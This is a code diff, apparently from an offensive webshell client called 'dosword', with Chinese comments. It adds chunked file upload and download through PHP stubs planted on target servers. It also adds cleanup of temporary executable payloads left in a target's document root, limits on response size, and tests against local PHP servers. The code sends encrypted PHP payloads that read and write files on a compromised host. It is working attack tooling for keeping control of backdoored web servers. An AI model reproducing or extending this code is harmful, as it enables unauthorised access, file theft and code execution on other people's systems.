@@ -30,11 +30,18 @@ use dosword_sdk::{Protocol, ProtocolError, SessionState};
 pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";
 
 /// 编码器是否启用分阶段载荷模式：`"session": true` 或编码器本身为 xor_session。
+///
+/// NATIVE 系列自带**内置功能分发**骨架（stub 中直接内置命令/文件函数），
+/// 没有可注入处理器的 eval 通道，`stub_session()` 也只是回退为普通 stub。
+/// 因此对 native* 忽略 session 开关，否则客户端会走分阶段通道向 NATIVE stub
+/// 发裸密文请求体（stub 只认 `$_POST['formData']`）→ 恒定失败。
 fn session_mode_for(protocol_params: &str, encoder: &dyn PayloadEncoder) -> bool {
     if encoder.id() == "xor_session" {
         return true;
     }
-    session_enabled(protocol_params) && encoder.id() != "php_stream"
+    !encoder.id().starts_with("native")
+        && session_enabled(protocol_params)
+        && encoder.id() != "php_stream"
 }
 
 /// 分阶段载荷（Godzilla session 模式）是否启用：protocol_params 中 `"session": true`。
@@ -91,6 +98,11 @@ pub struct PhpSession {
     pub initialized: std::sync::Mutex<bool>,
     /// 分阶段载荷模式（protocol_params 中 session: true 且编码器支持）。
     pub session_mode: bool,
+    /// stub 是否上报 `ChunkedTransfer` 能力（read/write 支持 o/l 偏移）。
+    ///
+    /// 旧版 stub 的 read 会忽略偏移并返回**整文件**、write 会从头覆写——
+    /// 分块传输必须据此拒绝，否则会退化为"无限下载写满磁盘"或"静默截断覆盖"。
+    pub chunked: bool,
     /// 会话当前工作目录（cd 支持：每次命令前 stub 端 chdir）。
     pub cwd: std::sync::Mutex<String>,
 }
@@ -195,6 +207,7 @@ impl PhpProtocol {
                 encoder,
                 initialized: std::sync::Mutex::new(false),
                 session_mode: false,
+                chunked: false,
                 cwd: std::sync::Mutex::new(String::new()),
             };
             return self.session_probe(&php, settings);
@@ -211,6 +224,7 @@ impl PhpProtocol {
                 encoder,
                 initialized: std::sync::Mutex::new(false),
                 session_mode: true,
+                chunked: false,
                 cwd: std::sync::Mutex::new(String::new()),
             };
             return self.session_probe(&php, settings);
@@ -850,12 +864,20 @@ impl Protocol for PhpProtocol {
                 "载荷执行失败：目标无法访问临时脚本（当前目录与文档根不一致或不可写）".to_string(),
             ));
         }
-        let text = response
-            .text()
-            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
+        // 限长读取响应：临时脚本必须在**所有**返回路径上删除，否则读取失败会
+        // 把可执行载荷留在目标文档根（未鉴权可访问）。
+        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
+        let read_result = crate::protocol::transport::read_limited(response, max_bytes);
         // 4) 清理临时载荷
         let _ = self.delete_path(session, &path, settings);
-        Ok(text)
+        let bytes = read_result.map_err(|error| ProtocolError::ParseError(error.to_string()))?;
+        if bytes.len() > max_bytes as usize {
+            return Err(ProtocolError::ParseError(format!(
+                "响应超过大小上限（{}MB）",
+                settings.max_file_size_mb
+            )));
+        }
+        Ok(String::from_utf8_lossy(&bytes).into_owned())
     }
 
     fn probe(
@@ -875,6 +897,12 @@ impl Protocol for PhpProtocol {
         let client = build_client(settings);
         let result = self.probe_impl(profile, settings, Some(&client))?;
         let encoder = encoder_for(&profile.protocol_params);
+        // 分块能力：由 stub 的 probe 上报（NATIVE `__ENV__` / 分阶段 probe 的 info 表）
+        let chunked = result
+            .info
+            .get("ChunkedTransfer")
+            .map(|value| value == "1")
+            .unwrap_or(false);
         let session: Box<dyn SessionState> = Box::new(PhpSession {
             endpoint: profile.endpoint.clone(),
             password: profile.password.clone(),
@@ -882,6 +910,7 @@ impl Protocol for PhpProtocol {
             encoder,
             initialized: std::sync::Mutex::new(false),
             session_mode: session_mode_for(&profile.protocol_params, encoder),
+            chunked,
             cwd: std::sync::Mutex::new(result.current_dir.clone()),
         });
         Ok((session, result))
@@ -1224,6 +1253,30 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        // NATIVE / 分阶段载荷：必须走内置功能分发（stub 的 read 支持 o/l）。
+        // 早期实现在此处漏了分支，导致默认编码器下上传/下载全部失败。
+        if is_session(php) {
+            if !php.chunked {
+                return Err(ProtocolError::NotSupported(
+                    "目标 stub 不支持分块读取（未上报 ChunkedTransfer 能力）：\
+                     请用当前版本重新生成并上传 stub"
+                        .to_string(),
+                ));
+            }
+            let offset_text = offset.to_string();
+            let length_text = length.to_string();
+            let value = dispatch(
+                php,
+                "read",
+                &[("p", path), ("o", &offset_text), ("l", &length_text)],
+                settings,
+            )?;
+            return value
+                .get("data")
+                .and_then(|v| v.as_str())
+                .and_then(|s| B64.decode(s).ok())
+                .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()));
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
             "{}\n$p=base64_decode('{path_b64}');$off={off};$len={len};$f=@fopen($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@fseek($f,$off);}}$c=($len>0)?@fread($f,$len):@stream_get_contents($f);@fclose($f);$__r=array('ok'=>true,'data'=>base64_encode((string)$c));{}",
@@ -1261,6 +1314,25 @@ impl Protocol for PhpProtocol {
             .as_any()
             .downcast_ref::<PhpSession>()
             .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        // NATIVE / 分阶段载荷：offset=0 截断新建，offset>0 追加写（顺序分块上传）。
+        if is_session(php) {
+            if !php.chunked {
+                return Err(ProtocolError::NotSupported(
+                    "目标 stub 不支持分块写入（未上报 ChunkedTransfer 能力）：\
+                     请用当前版本重新生成并上传 stub"
+                        .to_string(),
+                ));
+            }
+            let data_b64 = B64.encode(content);
+            let offset_text = offset.to_string();
+            dispatch(
+                php,
+                "write",
+                &[("p", path), ("d", &data_b64), ("o", &offset_text)],
+                settings,
+            )?;
+            return Ok(());
+        }
         let path_b64 = B64.encode(path.as_bytes());
         let data_b64 = B64.encode(content);
         let code = format!(
@@ -1532,10 +1604,11 @@ fn session_post(
                 .to_string(),
         ));
     }
-    let bytes = response
-        .bytes()
-        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
+    // S10：流式限长读取（与 native_call 一致）。此前是全量缓冲后再比对上限，
+    // 恶意目标可用超大响应撑爆内存（release `panic="abort"` 下 OOM 会终止进程）。
     let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
+    let bytes = crate::protocol::transport::read_limited(response, max_bytes)
+        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
     if bytes.len() > max_bytes as usize {
         return Err(ProtocolError::ParseError(format!(
             "响应超过大小上限（{}MB）",
@@ -1558,9 +1631,6 @@ fn ensure_session_init(php: &PhpSession, settings: &AppSettings) -> Result<(), P
     }
     let code = dosword_sdk::encoder::session_handler_code();
     let payload = php.encoder.encode(code, &php.password);
-    if php.encoder.id().contains("chacha") {
-        eprintln!("[init] payload head: {}", &payload[..payload.len().min(40)]);
-    }
     let plain = session_post(php, payload, settings)?;
     let text = String::from_utf8_lossy(&plain);
     if !text.contains("ok") {
@@ -1746,6 +1816,8 @@ mod tests {
             allow_arbitrary_code: true,
             audit_retention_days: 90,
             gzip_enabled: true,
+            tls_verify: false,
+            allow_arbitrary_local_paths: false,
         }
     }
 
@@ -1951,6 +2023,127 @@ mod tests {
             let _ = std::fs::remove_dir_all(&dir);
             assert_eq!(stdout.trim(), "enc-ok", "{encoder_id} 输出不符");
         }
+    }
+
+    /// 回归：分块读取/写入必须走内置功能分发（NATIVE/分阶段通道），
+    /// 且目标 stub 必须上报 ChunkedTransfer 能力。
+    ///
+    /// 历史缺陷：read_chunk/write_chunk 缺少 is_session 分支，默认编码器下
+    /// 上传/下载 100% 失败；且没有能力标记时旧 stub 会忽略偏移 →
+    /// 下载无限追加、上传从头覆写。
+    #[test]
+    fn real_php_chunked_transfer_round_trip() {
+        let settings = settings();
+        for (encoder_id, session) in [("native", false), ("native", true)] {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", session)
+            else {
+                eprintln!(
+                    "跳过分块传输（{encoder_id} session={session}）：未检测到 php 可执行文件"
+                );
+                continue;
+            };
+            let mut profile = profile(&url);
+            profile.protocol_params =
+                format!(r#"{{"encoder":"{encoder_id}","session":{session}}}"#);
+            let result = (|| -> Result<(), ProtocolError> {
+                let (session_state, _) = PhpProtocol.connect(&profile, &settings)?;
+                let php = session_state
+                    .as_any()
+                    .downcast_ref::<PhpSession>()
+                    .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+                assert!(php.chunked, "stub 应上报 ChunkedTransfer 能力");
+                // 三块顺序写入（含非 ASCII 与二进制字节）
+                let chunks: [Vec<u8>; 3] = [
+                    "第一块数据".as_bytes().to_vec(),
+                    vec![0u8, 1, 2, 255, 254, 253],
+                    "third-chunk".as_bytes().to_vec(),
+                ];
+                let mut offset = 0u64;
+                for chunk in &chunks {
+                    PhpProtocol.write_chunk(
+                        session_state.as_ref(),
+                        "/chunked.bin",
+                        chunk,
+                        offset,
+                        &settings,
+                    )?;
+                    offset += chunk.len() as u64;
+                }
+                let expected: Vec<u8> = chunks.concat();
+                let whole =
+                    PhpProtocol.read_file(session_state.as_ref(), "/chunked.bin", &settings)?;
+                assert_eq!(whole, expected, "整文件内容应一致");
+
+                // 偏移 + 长度切片
+                let slice = PhpProtocol.read_chunk(
+                    session_state.as_ref(),
+                    "/chunked.bin",
+                    4,
+                    6,
+                    &settings,
+                )?;
+                assert_eq!(slice, expected[4..10].to_vec(), "偏移读取内容应一致");
+                // length=0 表示读到文件尾
+                let tail = PhpProtocol.read_chunk(
+                    session_state.as_ref(),
+                    "/chunked.bin",
+                    (expected.len() - 4) as u64,
+                    0,
+                    &settings,
+                )?;
+                assert_eq!(tail, expected[expected.len() - 4..].to_vec());
+                // 越界偏移返回空（EOF 信号），不得报错
+                let eof = PhpProtocol.read_chunk(
+                    session_state.as_ref(),
+                    "/chunked.bin",
+                    expected.len() as u64,
+                    16,
+                    &settings,
+                )?;
+                assert!(eof.is_empty(), "文件末尾之后应返回空块");
+                Ok(())
+            })();
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+            if let Err(error) = result {
+                panic!("分块传输往返失败（{encoder_id} session={session}）：{error}");
+            }
+        }
+    }
+
+    /// 生成物结构断言：不依赖 php 也能跑，防止能力标记与偏移参数被误删。
+    #[test]
+    fn native_stub_advertises_chunked_transfer_and_offsets() {
+        use dosword_sdk::EncoderRegistry;
+        let encoder = EncoderRegistry::global()
+            .get("native")
+            .expect("native 编码器");
+        let stub = encoder.stub("php", "secret").expect("生成 php stub");
+        assert!(
+            stub.contains("'ChunkedTransfer'=>'1'"),
+            "NATIVE stub 必须上报分块能力"
+        );
+        assert!(
+            stub.contains("function __FETCH__($p,$o=0,$l=0)") || stub.contains("($p,$o=0,$l=0)"),
+            "NATIVE stub 的读取必须接受偏移/长度"
+        );
+        assert!(
+            stub.contains("FILE_APPEND"),
+            "NATIVE stub 的顺序分块写入应使用 FILE_APPEND"
+        );
+        // 能力标记必须在 NATIVE 与分阶段（session）两条通道上都存在
+        let session_stub = encoder
+            .stub_session("php", "secret")
+            .expect("生成 session stub");
+        assert!(
+            session_stub.contains("ChunkedTransfer"),
+            "分阶段 stub 的 probe 必须上报分块能力"
+        );
+        assert!(
+            session_stub.contains("$l > 0 ? $l : null"),
+            "分阶段 stub 的 read 必须支持长度参数"
+        );
     }
 
     #[test]
@@ -3366,10 +3559,22 @@ except Exception as e:
         password: &str,
         session: bool,
     ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
-        let php = std::process::Command::new("php").arg("-v").output().ok()?;
-        if !php.status.success() {
-            return None;
-        }
+        // 缺 php 时测试会静默跳过——CI 上这等于"假绿"。
+        // 设置 DOSWORD_REQUIRE_PHP=1 可把跳过变成硬失败（CI 已启用）。
+        let require_php = std::env::var("DOSWORD_REQUIRE_PHP").is_ok();
+        let php = match std::process::Command::new("php").arg("-v").output() {
+            Ok(output) if output.status.success() => output,
+            _ => {
+                if require_php {
+                    panic!(
+                        "DOSWORD_REQUIRE_PHP 已设置，但未找到可用的 php 可执行文件：\
+                         真实往返测试无法运行（请安装 php-cli 或取消该环境变量）"
+                    );
+                }
+                return None;
+            }
+        };
+        let _ = php;
         let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
         let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
         std::fs::create_dir_all(&dir).ok()?;
